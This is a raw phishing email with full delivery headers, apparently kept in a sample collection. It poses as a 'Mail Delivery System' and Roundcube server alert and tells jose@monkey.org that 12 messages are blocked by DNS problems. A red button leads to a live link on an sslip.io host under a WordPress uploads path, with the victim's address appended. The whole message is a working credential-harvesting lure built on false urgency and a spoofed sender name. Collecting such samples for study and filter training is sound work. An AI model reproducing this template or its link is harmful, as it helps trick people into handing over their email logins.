@@ -1,0 +1,147 @@
+Return-Path: yara@tamdiemduan.com
+Delivered-To: jose@monkey.org
+X-FDA: 83880760320.13.2551760
+Received: from other.tamdiemduan.com (other.tamdiemduan.com [94.156.175.67])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP id 25991160015
+	for <jose@monkey.org>; Fri, 12 Sep 2025 14:01:18 +0000 (UTC)
+Authentication-Results: imf23.b.hostedemail.com;
+	dkim=pass header.d=tamdiemduan.com header.s=dkim header.b=HjDbkwhV;
+	spf=pass (imf23.b.hostedemail.com: domain of yara@tamdiemduan.com designates
+ 94.156.175.67 as permitted sender) smtp.mailfrom=yara@tamdiemduan.com;
+	dmarc=pass (policy=none) header.from=tamdiemduan.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1757685679;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=y6BApuWmymEOaDahj4v7xtC/5TiH/fW2R8Xq/A/RbD8=;
+	b=zL3kDZNA0YP9q+teLo3aqS0/HvURGg90v1cUPPoeFxRQV1Gn5ZiOVNkHgpQk2FB5ZJZskN
+	XynjUPEJUD8lm05QUdYucXk/tUWDF8rRuen70H4rNg09xvP3YhC+q41NDm/QuzLXuStfGl
+	Gxeepogs97ZQg25s7uTUIE/EvrV8pII=
+ARC-Authentication-Results: i=1;
+	imf23.b.hostedemail.com;
+	dkim=pass header.d=tamdiemduan.com header.s=dkim header.b=HjDbkwhV;
+	spf=pass (imf23.b.hostedemail.com: domain of yara@tamdiemduan.com designates
+ 94.156.175.67 as permitted sender) smtp.mailfrom=yara@tamdiemduan.com;
+	dmarc=pass (policy=none) header.from=tamdiemduan.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1757685679; a=rsa-sha256;
+	cv=none;
+	b=ivXwdzKX2QfMagWjp65F6M3NU9xcNxtcsIc+RtucTXdnCzuwg3+hZlej+ymCsxjdVQsnlw
+	F18z5aHHviSadS33Lg4nKKQtedD+yFD9kiWB5v7z/m+IU7uGoqXYs8nG1sUdauQAjuHjkO
+	YM8YIw3E58O5EgsybTGi00h6MHOksmg=
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=tamdiemduan.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
+ i=yara@tamdiemduan.com;
+ bh=ubwceuymC9JBf12Um5NqEIKPxOk=;
+ b=HjDbkwhVMgHO361PsH6VxFl5IspYnDxrd9FuR/Pb8yZRgy7yErK3TrG223vM8CicwPLuo8+Fhvc1
+   Rma4nQe70pD92VciU8cLw0wXhv/G/eFAqvnYHcvxHiO3ib1knZKJOUw66PHb59ETj/R/0KvCs9SC
+   2KUoCdjAtHzCbQlT07PwmO7JFPVhGiXNfc0eEYVkzJIuIiGlikx0Z7V6j1QsiP70PMMIShop5/3C
+   aLnJbrdTEztHUmyKgGReDTCeiWrpDXrn2r+TwfRM3TBDQbJHRiL9xw8o1/s5YlW8JUOD1wMGw164
+   D2yas2wFrk6G8xj1VowZr3dhWdVSe+uRddG4jg==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=tamdiemduan.com;
+ b=tmQ3zGLpPAE8BhVuo8sakpbQ0YkY4bnAg3Uo2CZiLVpX58GEYHtswbQAYeZTVpgtfJHGKpA85HI5
+   8bLsXp+2iq9c6bcfQXU5/uJfZxiyPBqxWRTGJ0SIxpyfnG5P5B6pSRn8MpGV8bO7f1dP38cDcMF9
+   J1om/09LONBVsjBG6Mt2XJBKhK2KV0lNtNiaFOKPIow3o1/ejdtBsM4TGJ2y1nueB7ehi3WLcORW
+   8NyTD2XKbV0zq1VNHqCDH5hV+weq88KuPllCmodjYVrfuITygQWiGHtFbgOMRWzzhqBa2NioxU3H
+   I7Jnw4dOooI40x3f++vuZv+NXgTpgAcrlkg/aw==;
+From: Mail Delivery System monkey.org  <yara@tamdiemduan.com>
+To: jose@monkey.org
+Subject: Security Alert on jose@monkey.org
+Date: 09 Sep 2025 01:20:17 -0700
+Message-ID: <20250909012017.4CD138536A1B836E@tamdiemduan.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 25991160015
+X-Rspam-User: 
+X-Stat-Signature: 3ropxn4pwjzteka3cb7j46bgkji11z96
+X-Spam-Status: No, score=7.30
+X-Rspamd-Server: rspam10
+X-HE-Tag: 1757685678-157562
+X-HE-Meta: 
+ U2FsdGVkX1/+KZ2FThax/vOagXhZRgUkwst4i7mf8xDsV7hDkx+JvsgIiqELfGvZkCERYo0+wClnMxroy9PRTx6tLce5Epcy0zKBiJYwNn0pBMuF6t6vY+VHMMZVOqPLdy5/Cv33JhIynK7fcYDhvHYNX2z+k+AhPKpkqWBrfdk5CetxjZrVREFi8GYDG5nMWPoui94FyX8GSqigik2+rTqqzgruSbyrLwplQq/+T14GpLnsz/IwnJyjM7ENqwCecrC+xkFh6nWZdqZnwm2K9LvghT+yNgQ7N9RxV78zMpx+tZBcVLSb8uMjb2O9GUwdjqgpKciKQ2kuQq+kTQBTrqXsgFQQIX3nCVLCWWtB9QDHOU90SMMt+MFzGqEIeL9TJwZ5ggdo6OoMaQIqZHZ2ajOdFVR5CvLbfwgGvOmH15sqTYNCw1WWk9MFL4qt4iTrv9eRay+kdifTe9F63S+48EoUrHKAjbAwymbmAIcqtidOaLIeXJ2XUxgK8durj4pMixFB8Uz9GNLiypWGCaJl4h2eVk66wfJdVuuQJF8Oo2F8NpdXeNJ0JCtwXlzbS5kEKXLyklBtvPgcU3ggA3Xm4S626PAeVo09kc+EbXUpQ4Q2NGhE1XAVjdlCGtiP8FX4IeIhYqn77rMhZTs2WnksPl6EnLYoLpTz9itEOkZFA7h3wjO14vyLqcSexorVtwA5/CTCJwDDM3kM2xwwPfqViH+nOgzNgJtC2SnqK3zybxPWfpngMlHlm2/n4z+235/X1Bct//Z8DQJJShyDhngnJ5Z0Mu4nRwF5NuiubKrU1uVIqDYh98aW85UVJGJyCkYK/Jh3+4rTYTfReEc66NfjVGxgMQpODtfM/uAwvrooCXUwcsCuPoPzonX7gvTFpKDr0PVy62R4RuOcyDbW/kfN+ygqG0kWhq4mGyYKpQiW2yCLMtLZLs2GncaUlTu45wMPzeCFQYPWKnGduUE1RIch6VvL8LU
+ wvLPcqjFsARZMlTBj/FGv2Yt0JmPntKmT6i4E074nHPL0AqIzJXZucRvflvMTB/b5fP9QvpUGm7xyqA5ZquhuA742JOm2Jd/HORODxPgsvPhHi5DVj+qtvRyfrCudtLg3vfN5n4yAqrIOj+73f/tcCGyz9Ce53/fHgZJXSkKx8rC6RmDPCcK29iRZ0jw9M+yxY1iMQPhpFMd6XrwljBuW1XhZHbXLw8hN727Oq9Ez5DZkSqzc3TGckr1Nrorop7bsaLPtScy2s0eTF2RXfczGLc1xaLMAmXwdWqWa/R91kGcZxlASTqfH8rO0/Wkfh8KeQMI409A9v1Uw7SytAWIJ0wLDoi9a6eEOTi1TylWIriXIQCHjD9DK/K6aA4uVl+CV7k8RFbhsEdcdloY=
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 360
+
+<!DOCTYPE html>
+
+<HTML><HEAD><TITLE>Roundcube Customer Server Message</TITLE>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3Dcontent-type>
+<STYLE>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    padding: 20px;
+}
+=2Econtainer {
+    background-color: #ffffff;
+    border: 1px solid #ddd;
+    padding: 20px;
+    max-width: 600px;
+    margin: 0 auto;
+}
+=2Eheader {
+    background-color: #003399;
+    color: white;
+    padding: 10px;
+    text-align: left;
+    font-size: 24px;
+}
+=2Ebutton {
+    background-color: #FF0000;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block;
+}
+=2Ebutton-container {
+    text-align: center; /* Center the button */
+    margin-top: 20px; /* Add some space above the button */
+}
+</STYLE>
+
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body style=3D"font-family: Arial, sans-serif;
+    background-color: #f4f4f4;
+    padding: 20px">
+<div style=3D"background-color: #ffffff;
+    border: 1px solid #ddd;
+    padding: 20px;
+    max-width: 600px;
+    margin: 0 auto" class=3D"container">
+<div style=3D"background-color: #003399;
+    color: white;
+    padding: 10px;
+    text-align: left;
+    font-size: 24px" class=3D"header">Roundcube=20
+<DIV style=3D"FONT-SIZE: 14px; TEXT-ALIGN: right">Customer Server Message</=
+DIV></DIV>
+<DIV style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; P=
+ADDING-RIGHT: 0px">
+<P>DEAR jose@monkey.org</P>
+<P>You have 12 important pending messages roundcube DNS servers, due to blo=
+ckage.</P>
+<P>Here's what to do next:</P>
+<UL>
+<LI>Follow the link below review them=20
+<LI>Release them=20
+<LI>Fix this issue </LI></UL>
+<div style=3D"text-align: center; /* Center the button */
+    margin-top: 20px; /* Add some space above the button */" class=3D"butto=
+n-container"><a style=3D"background-color: #FF0000;
+    color: white;
+    padding: 10px 20px;
+    text-decoration: none;
+    border-radius: 5px;
+    display: inline-block" class=3D"button" href=3D"https://wordpress-k0kgo=
+0s8w0ws84s08ckk8880.196.251.66.19.sslip.io/wp-content/uploads/redintone/ind=
+ex.html#jose@monkey.org">Review Important Messages and Fix Issue Now</A> </=
+DIV></DIV></DIV></BODY></HTML>
+
